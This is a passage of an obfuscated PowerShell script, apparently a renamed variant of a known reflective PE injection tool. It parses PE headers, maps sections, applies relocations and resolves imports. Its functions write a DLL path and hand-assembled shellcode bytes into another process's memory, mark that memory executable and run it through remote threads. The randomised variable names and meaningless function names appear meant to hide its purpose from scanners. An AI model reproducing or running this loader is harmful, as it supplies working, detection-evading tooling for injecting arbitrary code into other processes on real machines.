		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $wGyvvcQf99
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($IdyDeYZx99.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($IdyDeYZx99.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($IdyDeYZx99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($IdyDeYZx99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$bRkXQtLA99 = [IntPtr](Balzac ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DIEZeRqh99.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $bRkXQtLA99
		}
		else
		{
			[IntPtr]$bRkXQtLA99 = [IntPtr](Balzac ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DIEZeRqh99.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $bRkXQtLA99
		}
		
		if (($IdyDeYZx99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($IdyDeYZx99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function slalom
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$lRZKwtTF99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$uCibJjmg99
		)
		
		$hcnzPZxK99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$DUmJSAUs99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($uCibJjmg99)
		$VkFXFiCP99 = [UIntPtr][UInt64]([UInt64]$DUmJSAUs99.Length + 1)
		$XaFmlUpU99 = $cxFnWjaC99.VirtualAllocEx.Invoke($lRZKwtTF99, [IntPtr]::Zero, $VkFXFiCP99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($XaFmlUpU99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$VDMWjOMd99 = [UIntPtr]::Zero
		$FdJKwcrL99 = $cxFnWjaC99.WriteProcessMemory.Invoke($lRZKwtTF99, $XaFmlUpU99, $uCibJjmg99, $VkFXFiCP99, [Ref]$VDMWjOMd99)
		
		if ($FdJKwcrL99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($VkFXFiCP99 -ne $VDMWjOMd99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$DSQYoQoB99 = $cxFnWjaC99.GetModuleHandle.Invoke("kernel32.dll")
		$HpTNwPYC99 = $cxFnWjaC99.GetProcAddress.Invoke($DSQYoQoB99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$dlIrGWZQ99 = [IntPtr]::Zero
		if ($PEInfo.PE64Bit -eq $true)
		{
			$NltBkjFD99 = $cxFnWjaC99.VirtualAllocEx.Invoke($lRZKwtTF99, [IntPtr]::Zero, $VkFXFiCP99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($NltBkjFD99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			$adyrUPkd99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$kkkaocIF99 = @(0x48, 0xba)
			$GImWuZnt99 = @(0xff, 0xd2, 0x48, 0xba)
			$XrdbuttP99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$yCzBTvfu99 = $adyrUPkd99.Length + $kkkaocIF99.Length + $GImWuZnt99.Length + $XrdbuttP99.Length + ($hcnzPZxK99 * 3)
			$vHNoXGpY99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($yCzBTvfu99)
			$vscvdxpI99 = $vHNoXGpY99
			
			avuncular -Bytes $adyrUPkd99 -qxCLnUIL99 $vHNoXGpY99
			$vHNoXGpY99 = Balzac $vHNoXGpY99 ($adyrUPkd99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($XaFmlUpU99, $vHNoXGpY99, $false)
			$vHNoXGpY99 = Balzac $vHNoXGpY99 ($hcnzPZxK99)
			avuncular -Bytes $kkkaocIF99 -qxCLnUIL99 $vHNoXGpY99
			$vHNoXGpY99 = Balzac $vHNoXGpY99 ($kkkaocIF99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($HpTNwPYC99, $vHNoXGpY99, $false)
			$vHNoXGpY99 = Balzac $vHNoXGpY99 ($hcnzPZxK99)
			avuncular -Bytes $GImWuZnt99 -qxCLnUIL99 $vHNoXGpY99
			$vHNoXGpY99 = Balzac $vHNoXGpY99 ($GImWuZnt99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($NltBkjFD99, $vHNoXGpY99, $false)
			$vHNoXGpY99 = Balzac $vHNoXGpY99 ($hcnzPZxK99)
			avuncular -Bytes $XrdbuttP99 -qxCLnUIL99 $vHNoXGpY99
			$vHNoXGpY99 = Balzac $vHNoXGpY99 ($XrdbuttP99.Length)
			
			$VRKikwti99 = $cxFnWjaC99.VirtualAllocEx.Invoke($lRZKwtTF99, [IntPtr]::Zero, [UIntPtr][UInt64]$yCzBTvfu99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($VRKikwti99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$FdJKwcrL99 = $cxFnWjaC99.WriteProcessMemory.Invoke($lRZKwtTF99, $VRKikwti99, $vscvdxpI99, [UIntPtr][UInt64]$yCzBTvfu99, [Ref]$VDMWjOMd99)
			if (($FdJKwcrL99 -eq $false) -or ([UInt64]$VDMWjOMd99 -ne [UInt64]$yCzBTvfu99))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$ESMoqUGA99 = utopia -vVbfBzxt99 $lRZKwtTF99 -StartAddress $VRKikwti99 -cxFnWjaC99 $cxFnWjaC99
			$rXPLntYP99 = $cxFnWjaC99.WaitForSingleObject.Invoke($ESMoqUGA99, 20000)
			if ($rXPLntYP99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[IntPtr]$xPoiIRej99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($hcnzPZxK99)
			$rXPLntYP99 = $cxFnWjaC99.ReadProcessMemory.Invoke($lRZKwtTF99, $NltBkjFD99, $xPoiIRej99, [UIntPtr][UInt64]$hcnzPZxK99, [Ref]$VDMWjOMd99)
			if ($rXPLntYP99 -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$dlIrGWZQ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($xPoiIRej99, [Type][IntPtr])
			$cxFnWjaC99.VirtualFreeEx.Invoke($lRZKwtTF99, $NltBkjFD99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$cxFnWjaC99.VirtualFreeEx.Invoke($lRZKwtTF99, $VRKikwti99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$ESMoqUGA99 = utopia -vVbfBzxt99 $lRZKwtTF99 -StartAddress $HpTNwPYC99 -TtUKPpQO99 $XaFmlUpU99 -cxFnWjaC99 $cxFnWjaC99
			$rXPLntYP99 = $cxFnWjaC99.WaitForSingleObject.Invoke($ESMoqUGA99, 20000)
			if ($rXPLntYP99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$mfmiajeT99 = 0
			$rXPLntYP99 = $cxFnWjaC99.GetExitCodeThread.Invoke($ESMoqUGA99, [Ref]$mfmiajeT99)
			if (($rXPLntYP99 -eq 0) -or ($mfmiajeT99 -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$dlIrGWZQ99 = [IntPtr]$mfmiajeT99
		}
		
		$cxFnWjaC99.VirtualFreeEx.Invoke($lRZKwtTF99, $XaFmlUpU99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $dlIrGWZQ99
	}
	
	
	Function riper
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$lRZKwtTF99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$OOrSxYGJ99,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)
		$hcnzPZxK99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$cvXppCNv99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		$bgPKknrJ99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$DBxlQEBo99 = $cxFnWjaC99.VirtualAllocEx.Invoke($lRZKwtTF99, [IntPtr]::Zero, $bgPKknrJ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($DBxlQEBo99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$VDMWjOMd99 = [UIntPtr]::Zero
		$FdJKwcrL99 = $cxFnWjaC99.WriteProcessMemory.Invoke($lRZKwtTF99, $DBxlQEBo99, $cvXppCNv99, $bgPKknrJ99, [Ref]$VDMWjOMd99)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($cvXppCNv99)
		if ($FdJKwcrL99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($bgPKknrJ99 -ne $VDMWjOMd99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$DSQYoQoB99 = $cxFnWjaC99.GetModuleHandle.Invoke("kernel32.dll")
		$ltdDGrVH99 = $cxFnWjaC99.GetProcAddress.Invoke($DSQYoQoB99, "GetProcAddress") #Kernel32 loaded to the same address for all processes
		
		$VUaJkiih99 = $cxFnWjaC99.VirtualAllocEx.Invoke($lRZKwtTF99, [IntPtr]::Zero, [UInt64][UInt64]$hcnzPZxK99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($VUaJkiih99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		[Byte[]]$BfgNRdLt99 = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$FafHcYsP99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$TwbiHGmw99 = @(0x48, 0xba)
			$AymkMVXJ99 = @(0x48, 0xb8)
			$LrIkaiyY99 = @(0xff, 0xd0, 0x48, 0xb9)
			$EprlcXcV99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$FafHcYsP99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$TwbiHGmw99 = @(0xb9)
			$AymkMVXJ99 = @(0x51, 0x50, 0xb8)
			$LrIkaiyY99 = @(0xff, 0xd0, 0xb9)
			$EprlcXcV99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$yCzBTvfu99 = $FafHcYsP99.Length + $TwbiHGmw99.Length + $AymkMVXJ99.Length + $LrIkaiyY99.Length + $EprlcXcV99.Length + ($hcnzPZxK99 * 4)
		$vHNoXGpY99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($yCzBTvfu99)
		$vscvdxpI99 = $vHNoXGpY99
		
		avuncular -Bytes $FafHcYsP99 -qxCLnUIL99 $vHNoXGpY99
		$vHNoXGpY99 = Balzac $vHNoXGpY99 ($FafHcYsP99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($OOrSxYGJ99, $vHNoXGpY99, $false)
		$vHNoXGpY99 = Balzac $vHNoXGpY99 ($hcnzPZxK99)
		avuncular -Bytes $TwbiHGmw99 -qxCLnUIL99 $vHNoXGpY99
		$vHNoXGpY99 = Balzac $vHNoXGpY99 ($TwbiHGmw99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($DBxlQEBo99, $vHNoXGpY99, $false)
		$vHNoXGpY99 = Balzac $vHNoXGpY99 ($hcnzPZxK99)
		avuncular -Bytes $AymkMVXJ99 -qxCLnUIL99 $vHNoXGpY99
		$vHNoXGpY99 = Balzac $vHNoXGpY99 ($AymkMVXJ99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($ltdDGrVH99, $vHNoXGpY99, $false)
		$vHNoXGpY99 = Balzac $vHNoXGpY99 ($hcnzPZxK99)
		avuncular -Bytes $LrIkaiyY99 -qxCLnUIL99 $vHNoXGpY99
		$vHNoXGpY99 = Balzac $vHNoXGpY99 ($LrIkaiyY99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($VUaJkiih99, $vHNoXGpY99, $false)
		$vHNoXGpY99 = Balzac $vHNoXGpY99 ($hcnzPZxK99)
		avuncular -Bytes $EprlcXcV99 -qxCLnUIL99 $vHNoXGpY99
		$vHNoXGpY99 = Balzac $vHNoXGpY99 ($EprlcXcV99.Length)
		
		$VRKikwti99 = $cxFnWjaC99.VirtualAllocEx.Invoke($lRZKwtTF99, [IntPtr]::Zero, [UIntPtr][UInt64]$yCzBTvfu99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($VRKikwti99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$FdJKwcrL99 = $cxFnWjaC99.WriteProcessMemory.Invoke($lRZKwtTF99, $VRKikwti99, $vscvdxpI99, [UIntPtr][UInt64]$yCzBTvfu99, [Ref]$VDMWjOMd99)
		if (($FdJKwcrL99 -eq $false) -or ([UInt64]$VDMWjOMd99 -ne [UInt64]$yCzBTvfu99))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$ESMoqUGA99 = utopia -vVbfBzxt99 $lRZKwtTF99 -StartAddress $VRKikwti99 -cxFnWjaC99 $cxFnWjaC99
		$rXPLntYP99 = $cxFnWjaC99.WaitForSingleObject.Invoke($ESMoqUGA99, 20000)
		if ($rXPLntYP99 -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		[IntPtr]$xPoiIRej99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($hcnzPZxK99)
		$rXPLntYP99 = $cxFnWjaC99.ReadProcessMemory.Invoke($lRZKwtTF99, $VUaJkiih99, $xPoiIRej99, [UIntPtr][UInt64]$hcnzPZxK99, [Ref]$VDMWjOMd99)
		if (($rXPLntYP99 -eq $false) -or ($VDMWjOMd99 -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$DmdXFRKj99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($xPoiIRej99, [Type][IntPtr])
		$cxFnWjaC99.VirtualFreeEx.Invoke($lRZKwtTF99, $VRKikwti99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$cxFnWjaC99.VirtualFreeEx.Invoke($lRZKwtTF99, $DBxlQEBo99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$cxFnWjaC99.VirtualFreeEx.Invoke($lRZKwtTF99, $VUaJkiih99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DmdXFRKj99
	}
	Function reassured
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$IKHGtPzF99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$cxFnWjaC99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$DIEZeRqh99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$bRkXQtLA99 = [IntPtr](Balzac ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DIEZeRqh99.IMAGE_SECTION_HEADER)))
			$CkAQXycf99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($bRkXQtLA99, [Type]$DIEZeRqh99.IMAGE_SECTION_HEADER)
		
			[IntPtr]$DIaIevEM99 = [IntPtr](Balzac ([Int64]$PEInfo.PEHandle) ([Int64]$CkAQXycf99.VirtualAddress))
			
			$MYREJMCg99 = $CkAQXycf99.SizeOfRawData
			if ($CkAQXycf99.PointerToRawData -eq 0)
			{
				$MYREJMCg99 = 0
			}
			
			if ($MYREJMCg99 -gt $CkAQXycf99.VirtualSize)
			{
				$MYREJMCg99 = $CkAQXycf99.VirtualSize
			}
			
			if ($MYREJMCg99 -gt 0)
			{
				Ferris -zTyLmNSe99 "reassured::MarshalCopy" -PEInfo $PEInfo -StartAddress $DIaIevEM99 -Size $MYREJMCg99 | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($IKHGtPzF99, [Int32]$CkAQXycf99.PointerToRawData, $DIaIevEM99, $MYREJMCg99)
			}
		
			if ($CkAQXycf99.SizeOfRawData -lt $CkAQXycf99.VirtualSize)
			{
				$iVVJVymp99 = $CkAQXycf99.VirtualSize - $MYREJMCg99
				[IntPtr]$StartAddress = [IntPtr](Balzac ([Int64]$DIaIevEM99) ([Int64]$MYREJMCg99))
				Ferris -zTyLmNSe99 "reassured::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $iVVJVymp99 | Out-Null
				$cxFnWjaC99.memset.Invoke($StartAddress, 0, [IntPtr]$iVVJVymp99) | Out-Null
			}
		}
	}
	Function trumpeted
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$DtuimMSd99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$DIEZeRqh99
		)
		
		[Int64]$wBVceaZz99 = 0
		$BgKRUcia99 = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$RdlrWDzi99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DIEZeRqh99.IMAGE_BASE_RELOCATION)
		
		if (($DtuimMSd99 -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((harsh ($DtuimMSd99) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$wBVceaZz99 = stalls ($DtuimMSd99) ($PEInfo.EffectivePEHandle)
			$BgKRUcia99 = $false
		}
		elseif ((harsh ($PEInfo.EffectivePEHandle) ($DtuimMSd99)) -eq $true)
		{
			$wBVceaZz99 = stalls ($PEInfo.EffectivePEHandle) ($DtuimMSd99)
		}
		
		[IntPtr]$AnsAXLYH99 = [IntPtr](Balzac ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			$xWOhcGuv99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($AnsAXLYH99, [Type]$DIEZeRqh99.IMAGE_BASE_RELOCATION)
			if ($xWOhcGuv99.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]$pMCYgJxv99 = [IntPtr](Balzac ([Int64]$PEInfo.PEHandle) ([Int64]$xWOhcGuv99.VirtualAddress))
			$fotQpkEL99 = ($xWOhcGuv99.SizeOfBlock - $RdlrWDzi99) / 2
			for($i = 0; $i -lt $fotQpkEL99; $i++)
			{
				$wDcDzmYL99 = [IntPtr](Balzac ([IntPtr]$AnsAXLYH99) ([Int64]$RdlrWDzi99 + (2 * $i)))
				[UInt16]$ScibAmca99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($wDcDzmYL99, [Type][UInt16])
				[UInt16]$IRTlqCDH99 = $ScibAmca99 -band 0x0FFF
				[UInt16]$wCbtAufa99 = $ScibAmca99 -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$wCbtAufa99 = [Math]::Floor($wCbtAufa99 / 2)
				}
				if (($wCbtAufa99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($wCbtAufa99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]$YbPmBLvV99 = [IntPtr](Balzac ([Int64]$pMCYgJxv99) ([Int64]$IRTlqCDH99))
					[IntPtr]$LhQXpcWY99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($YbPmBLvV99, [Type][IntPtr])
		
					if ($BgKRUcia99 -eq $true)
					{
						[IntPtr]$LhQXpcWY99 = [IntPtr](Balzac ([Int64]$LhQXpcWY99) ($wBVceaZz99))
					}
					else
					{
						[IntPtr]$LhQXpcWY99 = [IntPtr](stalls ([Int64]$LhQXpcWY99) ($wBVceaZz99))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($LhQXpcWY99, $YbPmBLvV99, $false) | Out-Null
				}
				elseif ($wCbtAufa99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: $wCbtAufa99, relocationinfo: $ScibAmca99"
				}
			}
			
			$AnsAXLYH99 = [IntPtr](Balzac ([Int64]$AnsAXLYH99) ([Int64]$xWOhcGuv99.SizeOfBlock))
		}
	}
	Function drowns
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$cxFnWjaC99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$DIEZeRqh99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$lRZKwtTF99
		)
		
		$qUiHNsTk99 = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$qUiHNsTk99 = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$IHdWlnVG99 = Balzac ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ZGObOrvK99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IHdWlnVG99, [Type]$DIEZeRqh99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($ZGObOrvK99.Characteristics -eq 0 `
						-and $ZGObOrvK99.FirstThunk -eq 0 `
						-and $ZGObOrvK99.ForwarderChain -eq 0 `
						-and $ZGObOrvK99.Name -eq 0 `
						-and $ZGObOrvK99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}
				$sXKytSNo99 = [IntPtr]::Zero
				$uCibJjmg99 = (Balzac ([Int64]$PEInfo.PEHandle) ([Int64]$ZGObOrvK99.Name))
				$DUmJSAUs99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($uCibJjmg99)
				
				if ($qUiHNsTk99 -eq $true)
				{
					$sXKytSNo99 = slalom -lRZKwtTF99 $lRZKwtTF99 -uCibJjmg99 $uCibJjmg99
				}
				else
				{
					$sXKytSNo99 = $cxFnWjaC99.LoadLibrary.Invoke($DUmJSAUs99)
				}
				if (($sXKytSNo99 -eq $null) -or ($sXKytSNo99 -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $DUmJSAUs99"
				}
				
				[IntPtr]$CQdKZlpF99 = Balzac ($PEInfo.PEHandle) ($ZGObOrvK99.FirstThunk)
				[IntPtr]$oUROaKIW99 = Balzac ($PEInfo.PEHandle) ($ZGObOrvK99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$MBQCXlXS99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($oUROaKIW99, [Type][IntPtr])
				
				while ($MBQCXlXS99 -ne [IntPtr]::Zero)
				{
					$FmZSyxWq99 = ''
					[IntPtr]$BcePzaBd99 = [IntPtr]::Zero
					if([Int64]$MBQCXlXS99 -lt 0)
					{
						$FmZSyxWq99 = [Int64]$MBQCXlXS99 -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$iBlWRWCV99 = Balzac ($PEInfo.PEHandle) ($MBQCXlXS99)
						$iBlWRWCV99 = Balzac $iBlWRWCV99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$FmZSyxWq99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($iBlWRWCV99)
					}
					
					if ($qUiHNsTk99 -eq $true)
					{
						[IntPtr]$BcePzaBd99 = riper -lRZKwtTF99 $lRZKwtTF99 -OOrSxYGJ99 $sXKytSNo99 -FunctionName $FmZSyxWq99
					}
					else
					{
						if($FmZSyxWq99 -is [string])
						{
						    [IntPtr]$BcePzaBd99 = $cxFnWjaC99.GetProcAddress.Invoke($sXKytSNo99, $FmZSyxWq99)
						}
						else
						{
						    [IntPtr]$BcePzaBd99 = $cxFnWjaC99.GetProcAddressOrdinal.Invoke($sXKytSNo99, $FmZSyxWq99)
						}
					}
					
					if ($BcePzaBd99 -eq $null -or $BcePzaBd99 -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $FmZSyxWq99. Dll: $DUmJSAUs99"
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($BcePzaBd99, $CQdKZlpF99, $false)
					
					$CQdKZlpF99 = Balzac ([Int64]$CQdKZlpF99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$oUROaKIW99 = Balzac ([Int64]$oUROaKIW99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$MBQCXlXS99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($oUROaKIW99, [Type][IntPtr])
				}
				
				$IHdWlnVG99 = Balzac ($IHdWlnVG99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DIEZeRqh99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function spite
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$FyCNdxsO99
		)
		
		$ypSjvSlA99 = 0x0
		if (($FyCNdxsO99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($FyCNdxsO99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($FyCNdxsO99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ypSjvSlA99 = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ypSjvSlA99 = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($FyCNdxsO99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ypSjvSlA99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ypSjvSlA99 = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($FyCNdxsO99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($FyCNdxsO99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ypSjvSlA99 = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ypSjvSlA99 = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($FyCNdxsO99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ypSjvSlA99 = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ypSjvSlA99 = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($FyCNdxsO99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ypSjvSlA99 = $ypSjvSlA99 -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ypSjvSlA99
	}
	Function hook
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
